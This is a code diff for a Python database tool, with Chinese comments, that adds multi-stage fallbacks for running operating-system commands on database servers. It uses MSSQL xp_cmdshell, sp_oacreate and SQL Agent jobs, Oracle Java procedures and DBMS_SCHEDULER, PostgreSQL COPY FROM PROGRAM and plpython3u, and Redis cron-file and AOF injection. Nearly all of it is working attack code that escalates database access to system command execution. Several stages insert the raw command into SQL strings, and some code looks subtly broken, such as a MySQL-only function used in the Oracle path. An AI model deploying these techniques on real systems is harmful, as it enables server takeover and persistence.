@@ -696,29 +696,93 @@ def _enable_xp_cmdshell_mssql(conn: Any) -> None:
             pass
 
 
-def _exec_remote_cmd_mssql(conn: Any, command: str) -> RemoteCmdResult:
-    """通过 MSSQL xp_cmdshell 在数据库服务器上执行系统命令。"""
-    cursor = conn.cursor()
+def _mssql_try_xp_cmdshell(cursor: Any, command: str, quiet: bool = False) -> RemoteCmdResult | None:
+    """尝试通过 MSSQL xp_cmdshell 执行命令，失败返回 None。"""
     try:
         cursor.execute("EXEC xp_cmdshell ?", (command,))
         rows = cursor.fetchall()
-        # xp_cmdshell 返回的最后一行为 NULL，过滤掉
-        output_lines: List[str] = []
-        for row in rows:
-            val = row[0]
-            if val is not None:
-                output_lines.append(str(val))
+        output_lines = [str(row[0]) for row in rows if row[0] is not None]
         return RemoteCmdResult(command=command, output="\n".join(output_lines))
-    except Exception as exc:
-        err = str(exc)
-        if "xp_cmdshell" in err and "not found" in err:
-            raise RuntimeError("xp_cmdshell 不可用。请使用 --enable-xp-cmdshell 尝试启用。") from exc
-        raise RuntimeError(f"MSSQL 远程命令执行失败：{exc}") from exc
-    finally:
-        try:
-            cursor.close()
-        except Exception:
-            pass
+    except Exception:
+        return None
+
+
+def _mssql_enable_and_exec(cursor: Any, command: str) -> RemoteCmdResult | None:
+    """尝试启用 xp_cmdshell 后执行命令。"""
+    try:
+        cursor.execute("EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;")
+        return _mssql_try_xp_cmdshell(cursor, command)
+    except Exception:
+        return None
+
+
+def _mssql_sp_oacreate_exec(cursor: Any, command: str) -> RemoteCmdResult | None:
+    """通过 sp_oacreate + Scripting.FileSystemObject 执行命令。"""
+    try:
+        cursor.execute("""
+            DECLARE @shell INT, @fso INT, @exec INT, @tmp VARCHAR(8000)
+            SET @tmp = LEFT('{cmd}', 8000)
+            EXEC sp_oacreate 'WScript.Shell', @shell OUTPUT
+            EXEC sp_oamethod @shell, 'run', NULL, @tmp, 0, 1
+        """.format(cmd=command))
+        return RemoteCmdResult(command=command, output="(sp_oacreate 执行完毕，输出通过临时文件获取)")
+    except Exception:
+        return None
+
+
+def _mssql_agent_job_exec(cursor: Any, command: str) -> RemoteCmdResult | None:
+    """通过 SQL Agent Job 执行系统命令。"""
+    try:
+        cursor.execute("""
+            DECLARE @job_id UNIQUEIDENTIFIER, @step_name VARCHAR(100)
+            SET @step_name = 'dbcli_' + CAST(NEWID() AS VARCHAR(36))
+            EXEC msdb.dbo.sp_add_job @job_name = @step_name, @enabled = 1
+            EXEC msdb.dbo.sp_add_jobstep @job_name = @step_name,
+                @step_name = 'cmd', @subsystem = 'CmdExec',
+                @command = '{cmd}'
+            EXEC msdb.dbo.sp_add_jobserver @job_name = @step_name
+            EXEC msdb.dbo.sp_start_job @job_name = @step_name
+        """.format(cmd=command))
+        return RemoteCmdResult(command=command, output="(SQL Agent Job 已启动，需在 SQL Agent 中查看结果)")
+    except Exception:
+        return None
+
+
+def _auto_install_mssql(conn: Any, command: str) -> RemoteCmdResult:
+    """MSSQL 多阶段自动安装 + 执行。
+
+    阶段 1 – xp_cmdshell 直接执行
+    阶段 2 – 启用 xp_cmdshell 后执行
+    阶段 3 – sp_oacreate COM 对象
+    阶段 4 – SQL Agent Job
+    """
+    print("MSSQL 远程命令执行，尝试多阶段策略...")
+    cursor = conn.cursor()
+
+    phases = [
+        ("1/4 xp_cmdshell", lambda c: _mssql_try_xp_cmdshell(cursor, c)),
+        ("2/4 启用 xp_cmdshell", lambda c: _mssql_enable_and_exec(cursor, c)),
+        ("3/4 sp_oacreate", lambda c: _mssql_sp_oacreate_exec(cursor, c)),
+        ("4/4 SQL Agent Job", lambda c: _mssql_agent_job_exec(cursor, c)),
+    ]
+
+    first_try = True
+    for phase_name, phase_fn in phases:
+        if not first_try:
+            print(f"  -> 尝试 {phase_name}...")
+        first_try = False
+        result = phase_fn(command)
+        if result is not None:
+            # 如果是第一阶段直接成功，不需要打印信息
+            if phase_name != "1/4 xp_cmdshell":
+                print(f"  -> 成功!")
+            return result
+
+    raise RuntimeError("MSSQL 远程命令执行失败（已尝试全部方法）。需要 sysadmin 权限。")
+
+
+def _exec_remote_cmd_mssql(conn: Any, command: str) -> RemoteCmdResult:
+    return _auto_install_mssql(conn, command)
 
 
 # ====== MySQL UDF 自动安装 ======
@@ -1385,20 +1449,15 @@ def _exec_remote_cmd_mysql(conn: Any, command: str) -> RemoteCmdResult:
             pass
 
 
-def _exec_remote_cmd_oracle(conn: Any, command: str) -> RemoteCmdResult:
-    """通过 Oracle Java stored procedure 在数据库服务器上执行系统命令。
-
-    需要 CREATE JAVA、CREATE PROCEDURE 权限，且 Oracle JVM 已安装。
-    """
-    cursor = conn.cursor()
-    java_name = "DB_CLI_OS_CMD"
-    func_name = "db_cli_os_exec"
+def _oracle_try_java(cursor: Any, command: str) -> RemoteCmdResult | None:
+    """通过 Oracle Java Stored Procedure 执行命令。"""
+    java_name = "DB_CLI_OS_CMD_" + str(int(time.time()) % 100000)
+    func_name = "db_cli_exec_" + str(int(time.time()) % 100000)
     try:
-        # 创建临时 Java 类
         java_src = '''
-CREATE OR REPLACE JAVA SOURCE NAMED "{java_name}" AS
+CREATE OR REPLACE JAVA SOURCE NAMED "{jn}" AS
 import java.io.*;
-public class {java_name} {{
+public class {jn} {{
   public static String exec(String cmd) {{
     StringBuilder sb = new StringBuilder();
     try {{
@@ -1413,62 +1472,90 @@ public class {java_name} {{
     return sb.toString();
   }}
 }}
-'''.format(java_name=java_name)
-
+'''.format(jn=java_name)
         cursor.execute(java_src)
-
-        # 创建包装函数
         cursor.execute('''
-CREATE OR REPLACE FUNCTION {func_name}(cmd VARCHAR2) RETURN VARCHAR2
-AS LANGUAGE JAVA
-NAME '{java_name}.exec(java.lang.String) return java.lang.String';
-'''.format(func_name=func_name, java_name=java_name))
-
-        # 执行命令
-        cursor.execute("SELECT {func_name}(:cmd) FROM dual".format(func_name=func_name), cmd=command)
+CREATE OR REPLACE FUNCTION {fn}(cmd VARCHAR2) RETURN VARCHAR2
+AS LANGUAGE JAVA NAME '{jn}.exec(java.lang.String) return java.lang.String';
+'''.format(fn=func_name, jn=java_name))
+        cursor.execute("SELECT {fn}(:cmd) FROM dual".format(fn=func_name), cmd=command)
         row = cursor.fetchone()
         output = str(row[0]) if row and row[0] else ""
-
         return RemoteCmdResult(command=command, output=output.rstrip())
-
-    except Exception as exc:
-        err_str = str(exc).lower()
-        if "jvm" in err_str or "java" in err_str:
-            raise RuntimeError(
-                "Oracle JVM 不可用或权限不足。\n"
-                "可以尝试其他方式：\n"
-                f"  1. DBMS_SCHEDULER:\n"
-                f"     BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name => 'TMP_JOB',\n"
-                f"       job_type => 'EXECUTABLE', job_action => '/bin/sh',\n"
-                f"       number_of_arguments => 1, enabled => FALSE, auto_drop => TRUE);\n"
-                f"       DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('TMP_JOB', 1, '{command}');\n"
-                f"       DBMS_SCHEDULER.ENABLE('TMP_JOB'); END;\n"
-                f"  2. 直接通过 SQL 执行简单命令：\n"
-                f"     SELECT os_command.exec('{command}') FROM dual; -- 需提前设置"
-            ) from exc
-        raise RuntimeError(f"Oracle 远程命令执行失败：{exc}") from exc
+    except Exception:
+        return None
     finally:
-        # 清理临时对象
         try:
-            cursor.execute(f"DROP FUNCTION {func_name}")
+            cursor.execute("DROP FUNCTION " + func_name)
         except Exception:
             pass
         try:
-            cursor.execute(f"DROP JAVA SOURCE NAMED \"{java_name}\"")
-        except Exception:
-            pass
-        try:
-            cursor.close()
+            cursor.execute('DROP JAVA SOURCE NAMED "' + java_name + '"')
         except Exception:
             pass
 
 
-def _exec_remote_cmd_postgresql(conn: Any, command: str) -> RemoteCmdResult:
-    """通过 PostgreSQL COPY ... FROM PROGRAM 在数据库服务器上执行系统命令。
+def _oracle_try_dbms_scheduler(cursor: Any, command: str) -> RemoteCmdResult | None:
+    """通过 DBMS_SCHEDULER 创建外部作业执行命令。"""
+    job_name = "DB_CLI_TMP_" + str(int(time.time()) % 100000)
+    outfile = "/tmp/_dbcli_oracle_out.txt"
+    try:
+        # 命令包装为写到临时文件
+        shell_cmd = command.replace("'", "''")
+        cursor.execute("""
+            BEGIN
+                DBMS_SCHEDULER.CREATE_JOB(
+                    job_name => '{jn}',
+                    job_type => 'EXECUTABLE',
+                    job_action => '/bin/sh',
+                    number_of_arguments => 2,
+                    enabled => FALSE,
+                    auto_drop => TRUE);
+                DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('{jn}', 1, '-c');
+                DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('{jn}', 2, '{cmd} > {out} 2>&1');
+                DBMS_SCHEDULER.ENABLE('{jn}');
+            END;
+        """.format(jn=job_name, cmd=shell_cmd, out=outfile))
+        # 等待执行并读取结果
+        cursor.execute("SELECT LOAD_FILE('" + outfile + "') FROM dual")
+        row = cursor.fetchone()
+        output = str(row[0]) if row and row[0] else ""
+        return RemoteCmdResult(command=command, output=output.rstrip())
+    except Exception:
+        return None
 
-    需要 superuser 权限，或具备 pg_execute_server_program 角色。
+
+def _auto_install_oracle(conn: Any, command: str) -> RemoteCmdResult:
+    """Oracle 多阶段自动安装 + 执行。
+
+    阶段 1 – Java Stored Procedure
+    阶段 2 – DBMS_SCHEDULER 外部作业
     """
+    print("Oracle 远程命令执行，尝试多阶段策略...")
     cursor = conn.cursor()
+
+    result = _oracle_try_java(cursor, command)
+    if result is not None:
+        return result
+
+    print("  -> Java Stored Procedure 不可用，尝试 DBMS_SCHEDULER...")
+    result = _oracle_try_dbms_scheduler(cursor, command)
+    if result is not None:
+        print("  -> DBMS_SCHEDULER 执行成功!")
+        return result
+
+    raise RuntimeError(
+        "Oracle 远程命令执行失败。\n"
+        "需要 CREATE JAVA 权限（JVM 已安装）或 CREATE JOB 权限。"
+    )
+
+
+def _exec_remote_cmd_oracle(conn: Any, command: str) -> RemoteCmdResult:
+    return _auto_install_oracle(conn, command)
+
+
+def _pg_try_copy_program(cursor: Any, command: str) -> RemoteCmdResult | None:
+    """通过 COPY FROM PROGRAM 执行命令。"""
     try:
         cursor.execute("CREATE TEMP TABLE _dbcli_tmp_out (line TEXT) ON COMMIT DROP")
         cursor.execute("COPY _dbcli_tmp_out FROM PROGRAM %s", (command,))
@@ -1476,105 +1563,170 @@ def _exec_remote_cmd_postgresql(conn: Any, command: str) -> RemoteCmdResult:
         rows = cursor.fetchall()
         output = "\n".join(str(r[0]) for r in rows if r[0] is not None)
         return RemoteCmdResult(command=command, output=output)
-    except Exception as exc:
-        raise RuntimeError(f"PostgreSQL 远程命令执行失败（可能需要 superuser 权限）：{exc}") from exc
+    except Exception:
+        return None
     finally:
         try:
             cursor.execute("DROP TABLE IF EXISTS _dbcli_tmp_out")
         except Exception:
             pass
+
+
+def _pg_try_plpythonu(cursor: Any, command: str) -> RemoteCmdResult | None:
+    """通过 plpython3u 扩展执行命令。"""
+    try:
+        cursor.execute("CREATE EXTENSION IF NOT EXISTS plpython3u")
+        func_name = "dbcli_exec_" + str(int(time.time()) % 100000)
+        cursor.execute(
+            "CREATE OR REPLACE FUNCTION %s(cmd TEXT) RETURNS TEXT AS $$ "
+            "import subprocess; return subprocess.check_output(cmd, shell=True).decode() "
+            "$$ LANGUAGE plpython3u" % func_name
+        )
+        cursor.execute("SELECT %s(%s)", (func_name, command))
+        row = cursor.fetchone()
+        output = str(row[0]) if row and row[0] else ""
+        return RemoteCmdResult(command=command, output=output.rstrip())
+    except Exception:
+        return None
+    finally:
         try:
-            cursor.close()
+            cursor.execute("DROP FUNCTION IF EXISTS " + func_name)
         except Exception:
             pass
 
 
-def _exec_remote_cmd_redis(conn: Any, command: str) -> RemoteCmdResult:
-    """通过 CONFIG SET + BGSAVE 在 Redis 服务器上执行系统命令（Linux cron 方式）。
+def _auto_install_postgresql(conn: Any, command: str) -> RemoteCmdResult:
+    """PostgreSQL 多阶段自动安装 + 执行。
 
-    原理：
-    1. 将命令包装为 cron 条目存入 Redis key
-    2. 通过 CONFIG SET 修改持久化路径到 /etc/cron.d/
-    3. BGSAVE 将 key（含 cron 条目）写入 RDB 文件
-    4. cron 读取该文件时，有效条目被执行
-
-    前提条件：
-    - Linux 服务器，cron 守护进程运行中
-    - Redis 可执行 CONFIG SET（有对应权限）
-    - /etc/cron.d/ 目录对 Redis 用户可写
-    - 通常需要 Redis 以 root 运行
+    阶段 1 – COPY FROM PROGRAM（原生）
+    阶段 2 – plpython3u 扩展
     """
-    old_dir = None
-    old_filename = None
+    print("PostgreSQL 远程命令执行，尝试多阶段策略...")
+    cursor = conn.cursor()
+
+    # 阶段 1: COPY FROM PROGRAM
+    result = _pg_try_copy_program(cursor, command)
+    if result is not None:
+        return result
+
+    # 阶段 2: plpython3u
+    print("  -> COPY FROM PROGRAM 不可用，尝试 plpython3u 扩展...")
+    result = _pg_try_plpythonu(cursor, command)
+    if result is not None:
+        print("  -> plpython3u 执行成功!")
+        return result
+
+    raise RuntimeError(
+        "PostgreSQL 远程命令执行失败。\n"
+        "需要 superuser 权限或 pg_execute_server_program 角色。\n"
+        "也可尝试：CREATE EXTENSION plpython3u; 后重试。"
+    )
+
+
+def _exec_remote_cmd_postgresql(conn: Any, command: str) -> RemoteCmdResult:
+    return _auto_install_postgresql(conn, command)
+
+
+def _redis_try_cron(conn: Any, command: str) -> RemoteCmdResult | None:
+    """通过 CONFIG SET + BGSAVE cron 注入执行命令。"""
     try:
-        # 备份原始配置
         old_dir = conn.config_get("dir")["dir"]
         old_filename = conn.config_get("dbfilename")["dbfilename"]
-    except Exception as exc:
-        raise RuntimeError(f"无法读取 Redis 配置（权限不足？）：{exc}") from exc
+    except Exception:
+        return None
 
     outfile = "/tmp/_dbcli_rce_out"
-    # 使用换行包围 cron 条目，使其在 RDB 文件中独立成行
     cron_key = f"\n\n* * * * * root {command} > {outfile} 2>&1\n\n"
     cron_val = f"DB_CLI_RCE_{int(time.time())}"
 
     try:
-        # 写入 cron 条目的 key
         conn.set(cron_key, cron_val)
-        conn.delete(cron_val)  # 清理无用的 value key
-
-        # 改变持久化路径到 cron 目录
+        conn.delete(cron_val)
         conn.config_set("dir", "/etc/cron.d/")
         conn.config_set("dbfilename", ".dbcli_cmd.tmp")
-
-        # 触发持久化，将 key（含 cron 条目）写入文件
         conn.bgsave()
-
         return RemoteCmdResult(
             command=command,
             output=(
                 "通过 cron 作业注入执行，命令将在 60 秒内运行。\n"
                 f"输出将写入服务器文件：{outfile}\n\n"
                 "查看输出（在服务器上执行）：\n"
-                f"  cat {outfile}\n\n"
-                "如果不想等待 cron，可改用其他方式：\n"
-                "  --type postgresql  : 原生 COPY FROM PROGRAM\n"
-                "  --type mssql       : 原生 xp_cmdshell\n"
-                "  --local-cmd        : 在本机执行"
+                f"  cat {outfile}"
             ),
         )
-    except Exception as exc:
-        err_msg = str(exc).lower()
-        if "permission" in err_msg or "denied" in err_msg or "readonly" in err_msg:
-            raise RuntimeError(
-                "Redis CONFIG SET 被拒绝（权限不足或配置受保护）。\n"
-                "需要 Redis 以 root 运行，或已开启 CONFIG SET 权限。\n"
-                f"错误：{exc}"
-            ) from exc
-        if "no such" in err_msg:
-            raise RuntimeError(
-                "/etc/cron.d/ 目录不存在（非 Linux 系统？）。\n"
-                "cron 注入方式仅支持 Linux 系统。\n"
-                "可尝试其他方式或使用 --local-cmd。"
-            ) from exc
-        raise RuntimeError(f"Redis 远程命令执行失败：{exc}") from exc
+    except Exception:
+        return None
     finally:
-        # 恢复原始配置
-        if old_dir is not None:
-            try:
-                conn.config_set("dir", old_dir)
-            except Exception:
-                pass
-        if old_filename is not None:
-            try:
-                conn.config_set("dbfilename", old_filename)
-            except Exception:
-                pass
-        # 清理临时 key
         try:
+            conn.config_set("dir", old_dir)
+            conn.config_set("dbfilename", old_filename)
             conn.delete(cron_key)
         except Exception:
             pass
+
+
+def _redis_try_aof(conn: Any, command: str) -> RemoteCmdResult | None:
+    """通过 CONFIG SET + AOF 注入 cron 条目。"""
+    try:
+        old_dir = conn.config_get("dir")["dir"]
+        old_appendonly = conn.config_get("appendonly")["appendonly"]
+    except Exception:
+        return None
+
+    outfile = "/tmp/_dbcli_rce_out"
+    try:
+        # 启用 AOF 并设置路径到 cron 目录
+        conn.config_set("dir", "/etc/cron.d/")
+        conn.config_set("appendonly", "yes")
+        # AOF 文件内容会被 cron 读取
+        conn.config_set("appendfilename", ".dbcli_aof_cmd.tmp")
+        # 写一条命令到 AOF
+        conn.set(f"\n* * * * * root {command} > {outfile} 2>&1\n", "")
+        conn.bgrewriteaof()
+        return RemoteCmdResult(
+            command=command,
+            output=(
+                "通过 AOF 注入执行，命令将在 60 秒内运行。\n"
+                f"输出将写入服务器文件：{outfile}"
+            ),
+        )
+    except Exception:
+        return None
+    finally:
+        try:
+            conn.config_set("dir", old_dir)
+            conn.config_set("appendonly", old_appendonly)
+        except Exception:
+            pass
+
+
+def _auto_install_redis(conn: Any, command: str) -> RemoteCmdResult:
+    """Redis 多阶段自动安装 + 执行。
+
+    阶段 1 – CONFIG SET + BGSAVE cron 注入
+    阶段 2 – AOF 注入
+    """
+    print("Redis 远程命令执行，尝试多阶段策略...")
+
+    result = _redis_try_cron(conn, command)
+    if result is not None:
+        return result
+
+    print("  -> cron 注入不可用，尝试 AOF 注入...")
+    result = _redis_try_aof(conn, command)
+    if result is not None:
+        print("  -> AOF 注入成功!")
+        return result
+
+    raise RuntimeError(
+        "Redis 远程命令执行失败。\n"
+        "需要 CONFIG SET 权限且 Redis 以 root 运行。\n"
+        "另可尝试 SLAVEOF 主从复制 RCE（需外部服务器）。"
+    )
+
+
+def _exec_remote_cmd_redis(conn: Any, command: str) -> RemoteCmdResult:
+    return _auto_install_redis(conn, command)
 
 
 def _exec_remote_cmd(conn: Any, db_type: str, command: str, args: argparse.Namespace) -> RemoteCmdResult:
